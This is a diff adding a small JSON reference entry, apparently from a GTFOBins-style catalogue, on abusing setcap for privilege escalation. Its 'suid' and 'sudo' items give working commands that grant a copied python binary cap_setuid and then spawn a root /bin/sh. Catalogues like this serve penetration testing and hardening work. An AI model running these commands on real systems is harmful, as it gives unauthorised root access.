@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "suid": [
+      {
+        "description": "Can be used to give and capabilities to other files. cap_setuid for example gives an executable permissions to switch uid.",
+        "code": "cp $(which python) .\nsetcap cap_setuid+ep python\n./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "cp $(which python) .\nsudo setcap cap_setuid+ep python\n./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n"
+      }
+    ]
+  }
+}
